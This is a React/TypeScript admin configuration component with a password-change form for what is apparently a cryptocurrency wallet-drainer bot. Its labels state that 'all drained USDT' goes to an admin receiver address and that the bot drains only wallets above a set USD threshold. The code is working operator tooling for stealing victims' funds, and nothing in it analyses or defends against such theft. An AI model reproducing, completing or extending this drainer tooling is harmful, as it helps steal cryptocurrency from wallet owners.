"use client";

import { useState, useEffect, useCallback } from "react";
import { Save, Loader2, KeyRound, Eye, EyeOff } from "lucide-react";
import { useToast } from "@/components/ui/Toaster";

interface ConfigPanelProps {
  adminKey: string;
  onPasswordChanged?: (newPassword: string) => void;
}

export default function ConfigPanel({ adminKey, onPasswordChanged }: ConfigPanelProps) {
  const toast = useToast();

  // ─── System config state ─────────────────────────────────────────────────
  const [receiverAddress, setReceiverAddress] = useState("");
  const [minThreshold, setMinThreshold] = useState("2");
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [saved, setSaved] = useState(false);

  // ─── Change password state ────────────────────────────────────────────────
  const [currentPassword, setCurrentPassword] = useState("");
  const [newPassword, setNewPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [changingPassword, setChangingPassword] = useState(false);
  const [showCurrent, setShowCurrent] = useState(false);
  const [showNew, setShowNew] = useState(false);
  const [showConfirm, setShowConfirm] = useState(false);

  const authHeaders = { "x-admin-key": adminKey, "Content-Type": "application/json" };

  const fetchConfig = useCallback(async () => {
    try {
      const res = await fetch("/api/config", { headers: authHeaders });
      const data = await res.json();
      if (data.config) {
        setReceiverAddress(data.config["receiver_address"] ?? "");
        setMinThreshold(data.config["min_threshold_usd"] ?? "2");
      }
    } catch {
      // ignore
    } finally {
      setLoading(false);
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [adminKey]);

  useEffect(() => {
    fetchConfig();
  }, [fetchConfig]);

  async function handleSave() {
    setSaving(true);
    setSaved(false);
    try {
      const res = await fetch("/api/config", {
        method: "PUT",
        headers: authHeaders,
        body: JSON.stringify({
          receiver_address: receiverAddress.trim(),
          min_threshold_usd: minThreshold,
        }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error ?? `Save failed: ${res.status}`);
      setSaved(true);
      toast.success("Configuration saved successfully.");
      setTimeout(() => setSaved(false), 3000);
    } catch (err) {
      const message = err instanceof Error ? err.message : "Unknown error";
      toast.error(`Config save failed: ${message}`);
    } finally {
      setSaving(false);
    }
  }

  async function handleChangePassword() {
    if (!currentPassword || !newPassword || !confirmPassword) {
      toast.error("Please fill in all password fields.");
      return;
    }
    if (newPassword !== confirmPassword) {
      toast.error("New passwords do not match.");
      return;
    }
    if (newPassword.length < 6) {
      toast.error("New password must be at least 6 characters.");
      return;
    }

    setChangingPassword(true);
    try {
      const res = await fetch("/api/auth/change-password", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ currentPassword, newPassword }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error ?? `Failed: ${res.status}`);

      toast.success("Password changed successfully. You will be logged out.");
      setCurrentPassword("");
      setNewPassword("");
      setConfirmPassword("");

      // Notify parent so it can update sessionStorage and re-login
      setTimeout(() => {
        onPasswordChanged?.(newPassword);
      }, 1500);
    } catch (err) {
      const message = err instanceof Error ? err.message : "Unknown error";
      toast.error(`Password change failed: ${message}`);
    } finally {
      setChangingPassword(false);
    }
  }

  if (loading) {
    return (
      <div className="flex items-center justify-center py-8">
        <Loader2 className="h-5 w-5 animate-spin text-gray-500" />
      </div>
    );
  }

  return (
    <div className="flex flex-col gap-5">
      {/* ── System Configuration ─────────────────────────────────────────── */}
      <div className="rounded-xl border border-gray-800 bg-[#111] p-6 flex flex-col gap-5">
        <h2 className="text-base font-semibold text-white">System Configuration</h2>

        <div className="flex flex-col gap-4">
          {/* Receiver Address */}
          <div className="flex flex-col gap-2">
            <label className="text-sm text-gray-400">
              Receiver Address <span className="text-gray-600">(Admin Wallet)</span>
            </label>
            <input
              type="text"
              value={receiverAddress}
              onChange={(e) => setReceiverAddress(e.target.value)}
              placeholder="0x..."
              className="rounded-lg border border-gray-700 bg-[#0d0d0d] px-4 py-3 text-sm font-mono text-white placeholder-gray-600 focus:border-gray-500 focus:outline-none transition-colors"
            />
            <p className="text-xs text-gray-600">All drained USDT will be sent to this address.</p>
          </div>

          {/* Minimum Threshold */}
          <div className="flex flex-col gap-2">
            <label className="text-sm text-gray-400">
              Minimum Threshold <span className="text-gray-600">(USD)</span>
            </label>
            <div className="flex items-center gap-2">
              <span className="text-gray-500 text-sm">$</span>
              <input
                type="number"
                value={minThreshold}
                onChange={(e) => setMinThreshold(e.target.value)}
                min="0"
                step="0.01"
                className="w-32 rounded-lg border border-gray-700 bg-[#0d0d0d] px-4 py-3 text-sm text-white placeholder-gray-600 focus:border-gray-500 focus:outline-none transition-colors"
              />
            </div>
            <p className="text-xs text-gray-600">
              Bot will only drain wallets with USDT balance above this value.
            </p>
          </div>
        </div>

        <button
          onClick={handleSave}
          disabled={saving}
          className="flex items-center gap-2 self-start px-5 py-2.5 rounded-lg bg-green-600 hover:bg-green-500 disabled:opacity-50 text-white text-sm font-medium transition-colors"
        >
          {saving ? <Loader2 className="h-4 w-4 animate-spin" /> : <Save className="h-4 w-4" />}
          {saved ? "Saved! ✅" : "Save Changes"}
        </button>
      </div>

      {/* ── Change Password ───────────────────────────────────────────────── */}
      <div className="rounded-xl border border-gray-800 bg-[#111] p-6 flex flex-col gap-5">
        <div className="flex items-center gap-2">
          <KeyRound className="h-4 w-4 text-gray-400" />
          <h2 className="text-base font-semibold text-white">Change Password</h2>
        </div>

        <div className="flex flex-col gap-4">
          {/* Current password */}
          <div className="flex flex-col gap-2">
            <label className="text-sm text-gray-400">Current Password</label>
            <div className="relative">
              <input
                type={showCurrent ? "text" : "password"}
                value={currentPassword}
                onChange={(e) => setCurrentPassword(e.target.value)}
                placeholder="Enter current password"
                className="w-full rounded-lg border border-gray-700 bg-[#0d0d0d] px-4 py-3 pr-10 text-sm text-white placeholder-gray-600 focus:border-gray-500 focus:outline-none transition-colors"
              />
              <button
                type="button"
                onClick={() => setShowCurrent((v) => !v)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-300 transition-colors"
              >
                {showCurrent ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
              </button>
            </div>
          </div>

          {/* New password */}
          <div className="flex flex-col gap-2">
            <label className="text-sm text-gray-400">New Password</label>
            <div className="relative">
              <input
                type={showNew ? "text" : "password"}
                value={newPassword}
                onChange={(e) => setNewPassword(e.target.value)}
                placeholder="At least 6 characters"
                className="w-full rounded-lg border border-gray-700 bg-[#0d0d0d] px-4 py-3 pr-10 text-sm text-white placeholder-gray-600 focus:border-gray-500 focus:outline-none transition-colors"
              />
              <button
                type="button"
                onClick={() => setShowNew((v) => !v)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-300 transition-colors"
              >
                {showNew ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
              </button>
            </div>
          </div>

          {/* Confirm new password */}
          <div className="flex flex-col gap-2">
            <label className="text-sm text-gray-400">Confirm New Password</label>
            <div className="relative">
              <input
                type={showConfirm ? "text" : "password"}
                value={confirmPassword}
                onChange={(e) => setConfirmPassword(e.target.value)}
                placeholder="Repeat new password"
                className="w-full rounded-lg border border-gray-700 bg-[#0d0d0d] px-4 py-3 pr-10 text-sm text-white placeholder-gray-600 focus:border-gray-500 focus:outline-none transition-colors"
              />
              <button
                type="button"
                onClick={() => setShowConfirm((v) => !v)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-300 transition-colors"
              >
                {showConfirm ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
              </button>
            </div>
          </div>
        </div>

        <button
          onClick={handleChangePassword}
          disabled={changingPassword}
          className="flex items-center gap-2 self-start px-5 py-2.5 rounded-lg bg-yellow-600 hover:bg-yellow-500 disabled:opacity-50 text-white text-sm font-medium transition-colors"
        >
          {changingPassword ? <Loader2 className="h-4 w-4 animate-spin" /> : <KeyRound className="h-4 w-4" />}
          Change Password
        </button>
      </div>
    </div>
  );
}
